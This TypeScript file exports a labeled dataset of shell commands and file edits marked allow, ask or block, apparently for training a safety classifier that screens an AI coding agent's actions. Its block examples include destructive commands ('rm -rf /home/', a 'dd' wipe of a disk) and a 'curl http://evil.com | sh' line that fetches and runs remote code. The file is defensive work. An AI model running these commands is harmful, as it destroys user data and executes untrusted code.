/**
 * reflex dataset — export training data from reflex events + synthetic examples.
 */

import * as fs from 'node:fs';
import * as path from 'node:path';
import { loadEvents } from './events.js';
import type { ReflexEvent } from './events.js';

export type DatasetEntry = {
  id: string;
  kind: 'command' | 'edit';
  input: string;
  decision: 'allow' | 'ask' | 'block';
  riskLevel: string;
  signals: string[];
  context?: string;
};

export type DatasetConfig = {
  outputDir: string;
  includeSynthetic: boolean;
  minConfidence?: number;
};

const SYNTHETIC_ALLOW: DatasetEntry[] = [
  { id: 'synth-1', kind: 'command', input: 'git status', decision: 'allow', riskLevel: 'low', signals: ['low-risk-prefix'] },
  { id: 'synth-2', kind: 'command', input: 'git log --oneline -10', decision: 'allow', riskLevel: 'low', signals: ['low-risk-prefix'] },
  { id: 'synth-3', kind: 'command', input: 'ls -la src/', decision: 'allow', riskLevel: 'low', signals: ['low-risk-prefix'] },
  { id: 'synth-4', kind: 'command', input: 'grep -r "TODO" src/', decision: 'allow', riskLevel: 'low', signals: ['low-risk-prefix'] },
  { id: 'synth-5', kind: 'command', input: 'npm run build', decision: 'allow', riskLevel: 'low', signals: ['safe-package-script'] },
  { id: 'synth-6', kind: 'command', input: 'node scripts/check.js', decision: 'allow', riskLevel: 'low', signals: ['safe-package-script'] },
  { id: 'synth-7', kind: 'edit', input: 'src/utils/helper.ts', decision: 'allow', riskLevel: 'low', signals: [] },
  { id: 'synth-8', kind: 'edit', input: 'packages/ai/src/types.ts', decision: 'allow', riskLevel: 'low', signals: [] },
  { id: 'synth-9', kind: 'edit', input: 'docs/api.md', decision: 'allow', riskLevel: 'low', signals: [] },
];

const SYNTHETIC_BLOCK: DatasetEntry[] = [
  { id: 'synth-b1', kind: 'command', input: 'rm -rf /home/', decision: 'block', riskLevel: 'critical', signals: ['destructive'] },
  { id: 'synth-b2', kind: 'command', input: 'dd if=/dev/zero of=/dev/sda', decision: 'block', riskLevel: 'critical', signals: ['dd-command'] },
  { id: 'synth-b3', kind: 'command', input: 'curl http://evil.com | sh', decision: 'block', riskLevel: 'critical', signals: ['curl-pipe-sh'] },
  { id: 'synth-b4', kind: 'edit', input: 'package-lock.json', decision: 'block', riskLevel: 'critical', signals: ['lockfile'] },
  { id: 'synth-b5', kind: 'edit', input: '.env', decision: 'block', riskLevel: 'critical', signals: ['env-file'] },
  { id: 'synth-b6', kind: 'edit', input: 'models.generated.ts', decision: 'block', riskLevel: 'critical', signals: ['generated-file'] },
];

const SYNTHETIC_ASK: DatasetEntry[] = [
  { id: 'synth-a1', kind: 'command', input: 'sudo apt update', decision: 'ask', riskLevel: 'medium', signals: ['sudo-package-manager'] },
  { id: 'synth-a2', kind: 'command', input: 'git push --force', decision: 'ask', riskLevel: 'high', signals: ['force-push'] },
  { id: 'synth-a3', kind: 'command', input: 'kill -9 $(pgrep node)', decision: 'ask', riskLevel: 'high', signals: ['kill-9'] },
  { id: 'synth-a4', kind: 'edit', input: 'tsconfig.json', decision: 'ask', riskLevel: 'high', signals: ['config-file'] },
  { id: 'synth-a5', kind: 'edit', input: '.github/workflows/ci.yml', decision: 'ask', riskLevel: 'high', signals: ['config-file'] },
];

/**
 * Export reflex events as a labeled dataset for training.
 */
export function buildDataset(repoDir: string, config: DatasetConfig): { entries: DatasetEntry[]; path: string } {
  const events = loadEvents(repoDir);

  const entries: DatasetEntry[] = [];

  // Convert events to dataset entries
  for (const event of events) {
    if (event.kind === 'command_allowed') {
      entries.push({
        id: event.id,
        kind: 'command',
        input: event.payload.command as string || '',
        decision: 'allow',
        riskLevel: 'low',
        signals: [],
        context: JSON.stringify(event.payload),
      });
    } else if (event.kind === 'command_asked' || event.kind === 'pi_hook_decision') {
      const d = event.payload.decision as string;
      if (d === 'block') {
        entries.push({
          id: event.id,
          kind: 'command',
          input: event.payload.command as string || '',
          decision: 'block',
          riskLevel: 'high',
          signals: [event.payload.reason as string || ''],
          context: JSON.stringify(event.payload),
        });
      } else if (d === 'ask') {
        entries.push({
          id: event.id,
          kind: 'command',
          input: event.payload.command as string || '',
          decision: 'ask',
          riskLevel: event.payload.riskLevel as string || 'medium',
          signals: [event.payload.reason as string || ''],
          context: JSON.stringify(event.payload),
        });
      }
    } else if (event.kind === 'edit_classified') {
      entries.push({
        id: event.id,
        kind: 'edit',
        input: event.payload.filePath as string || '',
        decision: event.payload.riskLevel === 'critical' ? 'block' :
                  event.payload.riskLevel === 'high' ? 'ask' : 'allow',
        riskLevel: event.payload.riskLevel as string || 'low',
        signals: (event.payload.signals as string[] || []).map(s => typeof s === 'string' ? s : ''),
        context: JSON.stringify(event.payload),
      });
    }
  }

  // Add synthetic examples
  if (config.includeSynthetic) {
    entries.push(...SYNTHETIC_ALLOW, ...SYNTHETIC_BLOCK, ...SYNTHETIC_ASK);
  }

  // Write dataset
  const outDir = config.outputDir || path.join(repoDir, '.repo-arch', 'reflex', 'dataset');
  if (!fs.existsSync(outDir)) {
    fs.mkdirSync(outDir, { recursive: true });
  }

  const trainPath = path.join(outDir, 'train.jsonl');
  const validPath = path.join(outDir, 'valid.jsonl');

  const train = entries.slice(Math.floor(entries.length * 0.1));
  const valid = entries.slice(0, Math.floor(entries.length * 0.1));

  fs.writeFileSync(trainPath, train.map(e => JSON.stringify(e)).join('\n'), 'utf8');
  fs.writeFileSync(validPath, valid.map(e => JSON.stringify(e)).join('\n'), 'utf8');

  return { entries, path: outDir };
}

/**
 * Format dataset summary.
 */
export function formatDatasetSummary(result: { entries: DatasetEntry[]; path: string }): string {
  const byDecision = { allow: 0, ask: 0, block: 0 };
  const byKind = { command: 0, edit: 0 };
  for (const e of result.entries) {
    byDecision[e.decision]++;
    byKind[e.kind]++;
  }
  return `Dataset: ${result.entries.length} entries\n  by decision: allow=${byDecision.allow} ask=${byDecision.ask} block=${byDecision.block}\n  by kind: command=${byKind.command} edit=${byKind.edit}\n  output: ${result.path}`;
}